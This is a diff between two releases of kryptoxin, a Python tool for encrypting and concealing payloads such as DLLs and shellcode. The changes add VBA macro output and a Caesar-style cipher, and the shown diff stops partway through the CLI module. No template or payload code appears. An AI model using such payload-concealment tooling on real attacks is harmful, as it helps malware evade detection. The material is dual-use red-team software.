# Comparing `tmp/kryptoxin-0.9.8.tar.gz` & `tmp/kryptoxin-0.9.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "/home/eprom/Downloads/personal/kryptoxin/dist/.tmp-9qergegl/kryptoxin-0.9.8.tar", last modified: Fri Mar 24 13:01:57 2023, max compression
+gzip compressed data, was "/home/eprom/Downloads/personal/kryptoxin/dist/.tmp-dej0q_o6/kryptoxin-0.9.9.tar", last modified: Wed May  3 08:03:13 2023, max compression
```

## Comparing `kryptoxin-0.9.8.tar` & `kryptoxin-0.9.9.tar`

### file list

```diff
@@ -1,57 +1,68 @@
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)    34523 2023-02-21 15:38:51.000000 kryptoxin-0.9.8/LICENSE
--rw-rw-r--   0 eprom     (1000) eprom     (1000)       79 2023-03-06 19:36:33.000000 kryptoxin-0.9.8/MANIFEST.in
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     5905 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/PKG-INFO
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     5221 2023-03-24 12:52:36.000000 kryptoxin-0.9.8/README.md
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.156250 kryptoxin-0.9.8/kryptoxin/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      175 2023-03-06 19:52:01.000000 kryptoxin-0.9.8/kryptoxin/__init__.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      176 2023-03-06 19:32:18.000000 kryptoxin-0.9.8/kryptoxin/__main__.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      102 2023-03-24 12:52:51.000000 kryptoxin-0.9.8/kryptoxin/__version__.py
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.156250 kryptoxin-0.9.8/kryptoxin/core/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)       81 2023-03-06 19:28:46.000000 kryptoxin-0.9.8/kryptoxin/core/__init__.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     7242 2023-03-10 10:11:32.000000 kryptoxin-0.9.8/kryptoxin/core/cli.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     2042 2023-03-06 15:46:16.000000 kryptoxin-0.9.8/kryptoxin/core/constants.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      430 2023-03-03 15:56:04.000000 kryptoxin-0.9.8/kryptoxin/core/log.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     4625 2023-03-19 10:16:30.000000 kryptoxin-0.9.8/kryptoxin/core/toxin.py
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.156250 kryptoxin-0.9.8/kryptoxin/crypto/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)       85 2023-03-03 15:56:04.000000 kryptoxin-0.9.8/kryptoxin/crypto/__init__.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     4057 2023-03-06 14:50:04.000000 kryptoxin-0.9.8/kryptoxin/crypto/aes.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      540 2023-03-02 09:44:36.000000 kryptoxin-0.9.8/kryptoxin/crypto/base64.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     1191 2023-02-27 14:43:29.000000 kryptoxin-0.9.8/kryptoxin/crypto/pbkdf2.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      178 2023-03-03 15:56:04.000000 kryptoxin-0.9.8/kryptoxin/crypto/random.py
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/kryptoxin/output/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      516 2023-03-06 19:35:59.000000 kryptoxin-0.9.8/kryptoxin/output/__init__.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     3241 2023-03-19 10:20:21.000000 kryptoxin-0.9.8/kryptoxin/output/csharp.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     3312 2023-03-15 10:48:20.000000 kryptoxin-0.9.8/kryptoxin/output/powershell.py
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      347 2023-03-03 15:56:04.000000 kryptoxin-0.9.8/kryptoxin/output/unformatted.py
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.156250 kryptoxin-0.9.8/kryptoxin/templates/
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.156250 kryptoxin-0.9.8/kryptoxin/templates/csharp/
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/kryptoxin/templates/csharp/actions/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      807 2023-03-17 12:02:56.000000 kryptoxin-0.9.8/kryptoxin/templates/csharp/actions/custom.jinja
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     3764 2023-03-20 09:17:40.000000 kryptoxin-0.9.8/kryptoxin/templates/csharp/actions/load-library.jinja
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     1056 2023-03-19 10:11:47.000000 kryptoxin-0.9.8/kryptoxin/templates/csharp/actions/print.jinja
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/kryptoxin/templates/csharp/decrypt/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     1815 2023-03-09 08:37:49.000000 kryptoxin-0.9.8/kryptoxin/templates/csharp/decrypt/aes-dotnet.jinja
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/kryptoxin/templates/csharp/transform/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      447 2023-03-06 13:22:29.000000 kryptoxin-0.9.8/kryptoxin/templates/csharp/transform/hexstr2bytearray.jinja
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.156250 kryptoxin-0.9.8/kryptoxin/templates/powershell/
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/kryptoxin/templates/powershell/actions/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      371 2023-03-15 13:07:50.000000 kryptoxin-0.9.8/kryptoxin/templates/powershell/actions/custom.jinja
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      678 2023-03-11 17:00:18.000000 kryptoxin-0.9.8/kryptoxin/templates/powershell/actions/load-asm.jinja
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      320 2023-03-15 10:51:16.000000 kryptoxin-0.9.8/kryptoxin/templates/powershell/actions/print.jinja
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/kryptoxin/templates/powershell/decode/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      343 2023-03-03 15:56:04.000000 kryptoxin-0.9.8/kryptoxin/templates/powershell/decode/base64.jinja
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/kryptoxin/templates/powershell/decrypt/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     1409 2023-03-06 14:35:17.000000 kryptoxin-0.9.8/kryptoxin/templates/powershell/decrypt/aes-dotnet.jinja
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.156250 kryptoxin-0.9.8/kryptoxin.egg-info/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     5905 2023-03-24 13:01:57.000000 kryptoxin-0.9.8/kryptoxin.egg-info/PKG-INFO
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     1243 2023-03-24 13:01:57.000000 kryptoxin-0.9.8/kryptoxin.egg-info/SOURCES.txt
--rw-rw-r--   0 eprom     (1000) eprom     (1000)        1 2023-03-24 13:01:57.000000 kryptoxin-0.9.8/kryptoxin.egg-info/dependency_links.txt
--rw-rw-r--   0 eprom     (1000) eprom     (1000)       26 2023-03-24 13:01:57.000000 kryptoxin-0.9.8/kryptoxin.egg-info/requires.txt
--rw-rw-r--   0 eprom     (1000) eprom     (1000)       10 2023-03-24 13:01:57.000000 kryptoxin-0.9.8/kryptoxin.egg-info/top_level.txt
--rw-rw-r--   0 eprom     (1000) eprom     (1000)        1 2023-03-07 15:56:46.000000 kryptoxin-0.9.8/kryptoxin.egg-info/zip-safe
--rw-rw-r--   0 eprom     (1000) eprom     (1000)       80 2023-02-24 08:37:53.000000 kryptoxin-0.9.8/pyproject.toml
--rw-rw-r--   0 eprom     (1000) eprom     (1000)      968 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/setup.cfg
--rwxr-xr-x   0 eprom     (1000) eprom     (1000)       91 2023-02-23 15:11:51.000000 kryptoxin-0.9.8/setup.py
-drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-03-24 13:01:57.160250 kryptoxin-0.9.8/tests/
--rw-rw-r--   0 eprom     (1000) eprom     (1000)     4167 2023-03-03 18:40:20.000000 kryptoxin-0.9.8/tests/test_cli.py
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.101847 kryptoxin-0.9.9/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)    34523 2023-02-21 15:38:51.000000 kryptoxin-0.9.9/LICENSE
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)       79 2023-03-06 19:36:33.000000 kryptoxin-0.9.9/MANIFEST.in
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     6053 2023-05-03 08:03:13.101847 kryptoxin-0.9.9/PKG-INFO
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     5369 2023-05-03 07:53:43.000000 kryptoxin-0.9.9/README.md
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.093847 kryptoxin-0.9.9/kryptoxin/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      293 2023-04-20 13:22:03.000000 kryptoxin-0.9.9/kryptoxin/__init__.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      185 2023-04-20 13:24:41.000000 kryptoxin-0.9.9/kryptoxin/__main__.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      102 2023-05-03 07:47:16.000000 kryptoxin-0.9.9/kryptoxin/__version__.py
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/core/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)       81 2023-03-06 19:28:46.000000 kryptoxin-0.9.9/kryptoxin/core/__init__.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     9948 2023-05-03 07:53:49.000000 kryptoxin-0.9.9/kryptoxin/core/cli.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     2319 2023-04-28 14:35:39.000000 kryptoxin-0.9.9/kryptoxin/core/constants.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      371 2023-05-02 09:00:57.000000 kryptoxin-0.9.9/kryptoxin/core/conv.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      420 2023-04-20 13:18:26.000000 kryptoxin-0.9.9/kryptoxin/core/log.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     5890 2023-05-02 12:04:33.000000 kryptoxin-0.9.9/kryptoxin/core/toxin.py
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/crypto/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)       85 2023-03-03 15:56:04.000000 kryptoxin-0.9.9/kryptoxin/crypto/__init__.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     4358 2023-04-27 14:22:21.000000 kryptoxin-0.9.9/kryptoxin/crypto/aes.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      495 2023-03-24 13:12:36.000000 kryptoxin-0.9.9/kryptoxin/crypto/base64.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1427 2023-05-02 14:31:59.000000 kryptoxin-0.9.9/kryptoxin/crypto/caesar.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1352 2023-04-20 13:19:51.000000 kryptoxin-0.9.9/kryptoxin/crypto/pbkdf2.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      178 2023-03-03 15:56:04.000000 kryptoxin-0.9.9/kryptoxin/crypto/random.py
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/output/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      550 2023-04-28 12:35:05.000000 kryptoxin-0.9.9/kryptoxin/output/__init__.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     3338 2023-04-27 09:01:07.000000 kryptoxin-0.9.9/kryptoxin/output/csharp.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     3409 2023-04-20 13:24:18.000000 kryptoxin-0.9.9/kryptoxin/output/powershell.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      347 2023-03-03 15:56:04.000000 kryptoxin-0.9.9/kryptoxin/output/unformatted.py
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1677 2023-05-02 12:16:01.000000 kryptoxin-0.9.9/kryptoxin/output/vba.py
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.093847 kryptoxin-0.9.9/kryptoxin/templates/
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.093847 kryptoxin-0.9.9/kryptoxin/templates/csharp/
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/templates/csharp/actions/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1101 2023-04-28 14:18:12.000000 kryptoxin-0.9.9/kryptoxin/templates/csharp/actions/custom.jinja
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     3781 2023-04-28 14:18:06.000000 kryptoxin-0.9.9/kryptoxin/templates/csharp/actions/load-library.jinja
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1063 2023-04-28 14:17:47.000000 kryptoxin-0.9.9/kryptoxin/templates/csharp/actions/print.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/templates/csharp/decrypt/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1822 2023-04-28 12:28:49.000000 kryptoxin-0.9.9/kryptoxin/templates/csharp/decrypt/aes-dotnet.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/templates/csharp/transform/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      449 2023-04-28 12:34:18.000000 kryptoxin-0.9.9/kryptoxin/templates/csharp/transform/hexstr2bytearray.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.093847 kryptoxin-0.9.9/kryptoxin/templates/powershell/
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/templates/powershell/actions/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      374 2023-05-01 08:26:22.000000 kryptoxin-0.9.9/kryptoxin/templates/powershell/actions/custom.jinja
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      681 2023-05-01 08:26:22.000000 kryptoxin-0.9.9/kryptoxin/templates/powershell/actions/load-asm.jinja
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      323 2023-04-28 12:36:49.000000 kryptoxin-0.9.9/kryptoxin/templates/powershell/actions/print.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/templates/powershell/decode/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      344 2023-04-28 11:24:02.000000 kryptoxin-0.9.9/kryptoxin/templates/powershell/decode/base64.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/templates/powershell/decrypt/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1410 2023-04-28 11:24:05.000000 kryptoxin-0.9.9/kryptoxin/templates/powershell/decrypt/aes-dotnet.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.093847 kryptoxin-0.9.9/kryptoxin/templates/vba/
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/templates/vba/actions/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     2064 2023-05-02 11:55:54.000000 kryptoxin-0.9.9/kryptoxin/templates/vba/actions/load-asm.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.097847 kryptoxin-0.9.9/kryptoxin/templates/vba/decrypt/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1941 2023-04-28 11:54:32.000000 kryptoxin-0.9.9/kryptoxin/templates/vba/decrypt/aes-dotnet.jinja
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      193 2023-05-02 12:10:06.000000 kryptoxin-0.9.9/kryptoxin/templates/vba/decrypt/caesar-native.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.101847 kryptoxin-0.9.9/kryptoxin/templates/vba/transform/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      493 2023-04-28 12:01:48.000000 kryptoxin-0.9.9/kryptoxin/templates/vba/transform/bytearraytostring.jinja
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.093847 kryptoxin-0.9.9/kryptoxin.egg-info/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     6053 2023-05-03 08:03:13.000000 kryptoxin-0.9.9/kryptoxin.egg-info/PKG-INFO
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     1523 2023-05-03 08:03:13.000000 kryptoxin-0.9.9/kryptoxin.egg-info/SOURCES.txt
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)        1 2023-05-03 08:03:13.000000 kryptoxin-0.9.9/kryptoxin.egg-info/dependency_links.txt
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)       26 2023-05-03 08:03:13.000000 kryptoxin-0.9.9/kryptoxin.egg-info/requires.txt
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)       10 2023-05-03 08:03:13.000000 kryptoxin-0.9.9/kryptoxin.egg-info/top_level.txt
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)        1 2023-03-07 15:56:46.000000 kryptoxin-0.9.9/kryptoxin.egg-info/zip-safe
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)       80 2023-02-24 08:37:53.000000 kryptoxin-0.9.9/pyproject.toml
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)      947 2023-05-03 08:03:13.101847 kryptoxin-0.9.9/setup.cfg
+-rwxr-xr-x   0 eprom     (1000) eprom     (1000)       91 2023-02-23 15:11:51.000000 kryptoxin-0.9.9/setup.py
+drwxrwxr-x   0 eprom     (1000) eprom     (1000)        0 2023-05-03 08:03:13.101847 kryptoxin-0.9.9/tests/
+-rw-rw-r--   0 eprom     (1000) eprom     (1000)     4167 2023-03-03 18:40:20.000000 kryptoxin-0.9.9/tests/test_cli.py
```

### Comparing `kryptoxin-0.9.8/LICENSE` & `kryptoxin-0.9.9/LICENSE`

 * *Files identical despite different names*

### Comparing `kryptoxin-0.9.8/PKG-INFO` & `kryptoxin-0.9.9/PKG-INFO`

 * *Files 5% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: kryptoxin
-Version: 0.9.8
+Version: 0.9.9
 Summary: A security-oriented payload encryption tool written in Python.
 Home-page: https://github.com/e3prom/kryptoxin
 Author: Nicolas Chabbey
 Author-email: eprom@toor.si
 License: GNU Affero General Public License v3
 Keywords: security,encryption
 Classifier: Programming Language :: Python :: 3
@@ -26,15 +26,15 @@
 [![License](https://img.shields.io/github/license/e3prom/kryptoxin?style=for-the-badge)](https://raw.githubusercontent.com/e3prom/kryptoxin/master/LICENSE)
 
 - [Kryptoxin](#kryptoxin)
   - [Description](#description)
   - [Features](#features)
   - [Installation](#installation)
     - [With pip (latest release)](#with-pip-latest-release)
-    - [With git (v0.9.8)](#with-git-v098)
+    - [With git (v0.9.9)](#with-git-v099)
   - [Usages examples](#usages-examples)
     - [Read, encrypt and decrypt, all from stdin](#read-encrypt-and-decrypt-all-from-stdin)
     - [Encrypt using AES-128-CFB](#encrypt-using-aes-128-cfb)
     - [Uses the PowerShell `load-asm` script template](#uses-the-powershell-load-asm-script-template)
   - [Documentation](#documentation)
   - [Disclaimer](#disclaimer)
   - [License](#license)
@@ -46,20 +46,22 @@
 The name `Kryptoxin` comes from the contraction of `Kryptos` (meaning `conceal`, `hidden` or `secret` in Greek) and the word `Toxin` (meaning `poison`). As the name implies, the intended goal of this project is to provide a fast and efficient way of concealing or hiding payloads, thus saving you a lot of time and effort. Most of our templates are "living off the land", using system libraries and encryption routines commonly found in base operating systems installations.
 
 ## Features
 
 The below features are supported:
 
 - Provides block-cipher encryption algorithms such as the `Advanced Encryption Standard` or `AES`.
+- Implements basic encryption ciphers such as a derivative of the [`Caesar Cipher`](https://en.wikipedia.org/wiki/Caesar_cipher).
 - Supports user-specifiable key sizes and block-cipher modes of operations, such as `AES256-CBC`.
 - Generate random cryptographic parameters such as `Initialization Vector` and `Salt`.
 - Encodes and properly formats variables for fast and streamlined copy/paste operations.
 - Handles `Text Files`, `Scripts`, `Portable Executables (PE)`, `Dynamic Link Libraries (DLLs)`, and `shellcodes` objects.
 - Generates compact, portable scripts or source codes as outputs for the below programming languages:
   - [x] PowerShell
+  - [x] VBA Macro
   - [x] C#
   - [ ] C++
   - [ ] C
 - Implement key derivation functions, such as `PBKDF2`.
 - Supports out-of-band key storage, with conditional trigger mechanisms (not yet available).
 - Includes scripts and source code templates to be used for security-related tasks and experimentation.
 
@@ -67,20 +69,20 @@
 
 ### With pip (latest release)
 
 ``` sh
 pip install kryptoxin
 ```
 
-### With git (v0.9.8)
+### With git (v0.9.9)
 
 ``` sh
 git clone https://github.com/e3prom/kryptoxin
 cd kryptoxin
-git checkout tags/0.9.8
+git checkout tags/0.9.9
 sudo make install
 ```
 
 ## Usages examples
 
 ### Read, encrypt and decrypt, all from stdin
```

### Comparing `kryptoxin-0.9.8/README.md` & `kryptoxin-0.9.9/README.md`

 * *Files 2% similar despite different names*

```diff
@@ -7,15 +7,15 @@
 [![License](https://img.shields.io/github/license/e3prom/kryptoxin?style=for-the-badge)](https://raw.githubusercontent.com/e3prom/kryptoxin/master/LICENSE)
 
 - [Kryptoxin](#kryptoxin)
   - [Description](#description)
   - [Features](#features)
   - [Installation](#installation)
     - [With pip (latest release)](#with-pip-latest-release)
-    - [With git (v0.9.8)](#with-git-v098)
+    - [With git (v0.9.9)](#with-git-v099)
   - [Usages examples](#usages-examples)
     - [Read, encrypt and decrypt, all from stdin](#read-encrypt-and-decrypt-all-from-stdin)
     - [Encrypt using AES-128-CFB](#encrypt-using-aes-128-cfb)
     - [Uses the PowerShell `load-asm` script template](#uses-the-powershell-load-asm-script-template)
   - [Documentation](#documentation)
   - [Disclaimer](#disclaimer)
   - [License](#license)
@@ -27,20 +27,22 @@
 The name `Kryptoxin` comes from the contraction of `Kryptos` (meaning `conceal`, `hidden` or `secret` in Greek) and the word `Toxin` (meaning `poison`). As the name implies, the intended goal of this project is to provide a fast and efficient way of concealing or hiding payloads, thus saving you a lot of time and effort. Most of our templates are "living off the land", using system libraries and encryption routines commonly found in base operating systems installations.
 
 ## Features
 
 The below features are supported:
 
 - Provides block-cipher encryption algorithms such as the `Advanced Encryption Standard` or `AES`.
+- Implements basic encryption ciphers such as a derivative of the [`Caesar Cipher`](https://en.wikipedia.org/wiki/Caesar_cipher).
 - Supports user-specifiable key sizes and block-cipher modes of operations, such as `AES256-CBC`.
 - Generate random cryptographic parameters such as `Initialization Vector` and `Salt`.
 - Encodes and properly formats variables for fast and streamlined copy/paste operations.
 - Handles `Text Files`, `Scripts`, `Portable Executables (PE)`, `Dynamic Link Libraries (DLLs)`, and `shellcodes` objects.
 - Generates compact, portable scripts or source codes as outputs for the below programming languages:
   - [x] PowerShell
+  - [x] VBA Macro
   - [x] C#
   - [ ] C++
   - [ ] C
 - Implement key derivation functions, such as `PBKDF2`.
 - Supports out-of-band key storage, with conditional trigger mechanisms (not yet available).
 - Includes scripts and source code templates to be used for security-related tasks and experimentation.
 
@@ -48,20 +50,20 @@
 
 ### With pip (latest release)
 
 ``` sh
 pip install kryptoxin
 ```
 
-### With git (v0.9.8)
+### With git (v0.9.9)
 
 ``` sh
 git clone https://github.com/e3prom/kryptoxin
 cd kryptoxin
-git checkout tags/0.9.8
+git checkout tags/0.9.9
 sudo make install
 ```
 
 ## Usages examples
 
 ### Read, encrypt and decrypt, all from stdin
```

### Comparing `kryptoxin-0.9.8/kryptoxin/core/cli.py` & `kryptoxin-0.9.9/kryptoxin/core/cli.py`

 * *Files 27% similar despite different names*

```diff
@@ -1,21 +1,34 @@
 """
 kryptoxin CLI Interface module.
 This is the cli interface module of the kryptoxin project.
 """
 import click
 import sys
-from .constants import *
-from .log import log
-from .toxin import Toxin
-from ..crypto import aes
-from ..output import unformatted, powershell, csharp
-
+from kryptoxin.core.log import log
+from kryptoxin.core.toxin import Toxin
+from kryptoxin.core.constants import CIPHER_AES, CIPHER_CAESAR
+from kryptoxin.core.constants import CIPHER_DEFAULT_ALGORITHM
+from kryptoxin.core.constants import CIPHER_DEFAULT_KEYSIZE
+from kryptoxin.core.constants import CIPHER_DEFAULT_BLOCKMODE
+from kryptoxin.core.constants import CIPHER_DEFAULT_IV
+from kryptoxin.core.constants import CIPHER_DEFAULT_SALT
+from kryptoxin.core.constants import CIPHER_DEFAULT_HMHASHALG
+from kryptoxin.core.constants import CIPHER_DEFAULT_PBKDF2_ITER
+from kryptoxin.core.constants import CIPHER_DEFAULT_RANDOMIV
+from kryptoxin.core.constants import CIPHER_DEFAULT_IV_PREPEND
+from kryptoxin.core.constants import PROGRAM_NAME, CLI_DISPLAYKEY
+from kryptoxin.core.constants import LANG_CSHARP, LANG_POWERSHELL
+from kryptoxin.core.constants import LANG_VBA
+from kryptoxin.crypto import aes, base64, caesar
+from kryptoxin.output import unformatted, powershell, csharp, vba
 
 # Sub-class of click.Group
+
+
 class NaturalOrderCommands(click.Group):
     def list_commands(self, ctx):
         """ This function returns commands in a natural order
         """
         return self.commands.keys()
 
 
@@ -24,15 +37,16 @@
     click.option('-i', '--in', 'input_file', type=click.File("rb"),
                  default=sys.stdin.buffer, nargs=1,
                  help="Input file (e,g. Script, .dll file)",),
     click.option('-o', '--out', 'output_file', type=click.File("wb"),
                  help="Output file"),
     click.option('-a', '--alg',
                  default=CIPHER_DEFAULT_ALGORITHM, show_default=True,
-                 type=click.Choice(['AES'], case_sensitive=False),
+                 type=click.Choice(
+                     [CIPHER_AES, CIPHER_CAESAR], case_sensitive=False),
                  help="Encryption algorithm"),
     click.option('-k', '--key', required=True, help="Encryption key string"),
     click.option('-s', '--key_size',
                  default=CIPHER_DEFAULT_KEYSIZE, show_default=True,
                  type=click.IntRange(0, 4096), help="Encryption key size"),
     click.option('-m', '--mode', 'opmode',
                  default=CIPHER_DEFAULT_BLOCKMODE, show_default=True,
@@ -45,15 +59,16 @@
                  help="Password hashing algorithm's salt"),
     click.option('-h', '--hmac',
                  default=CIPHER_DEFAULT_HMHASHALG, show_default=True,
                  type=click.Choice(['SHA1', 'SHA256', 'SHA512'],
                                    case_sensitive=False),
                  help="PBKDF2 HMAC algorithm"),
     click.option('--iter', 'pbkdf2_iter',
-                 default=CIPHER_DEFAULT_PBKDF2_ITER, show_default=True,
+                 default=CIPHER_DEFAULT_PBKDF2_ITER,
+                 show_default=True,
                  type=click.IntRange(0, 1000000),
                  help="PBKDF2 iteration count")
 ]
 
 
 def _add_cmd_options(options):
     """ This local function return the built function's options.
@@ -71,35 +86,41 @@
     pass
 
 
 @click.command(context_settings=dict(
     ignore_unknown_options=True, allow_extra_args=True
 ))
 @ _add_cmd_options(_cmd_opts_crypto)
-@click.option('--random-iv/--static-iv', default=CIPHER_DEFAULT_RANDOMIV,
+@click.option('--random-iv/--static-iv',
+              default=CIPHER_DEFAULT_RANDOMIV,
               help="Use a randomized or an all-zeros IV")
-@click.option('--random-salt/--static-salt', default=CIPHER_DEFAULT_RANDOMIV,
+@click.option('--random-salt/--static-salt',
+              default=CIPHER_DEFAULT_RANDOMIV,
               help="Use a randomized or an all-zeros Salt")
 @click.option('-l', '--lang',
-              type=click.Choice(['powershell', 'csharp'],
+              type=click.Choice(['powershell', 'csharp', 'vba'],
                                 case_sensitive=False),
               help="Output programming language")
 @click.option('-a', '--action', help="Action to perform (e,g. print)")
 @click.option('--show-key/--hide-key', default=CLI_DISPLAYKEY,
               help="Display the generated key")
 @click.pass_context
 def encrypt(ctx, alg, key, key_size, opmode, iv, random_iv, salt, random_salt,
             hmac, input_file, output_file, pbkdf2_iter, lang, action,
             show_key):
     """ This command perform encryption on the supplied input.
     It reads on stdin or the file supplied by the '--in' option.
     See Options below for more information.
     """
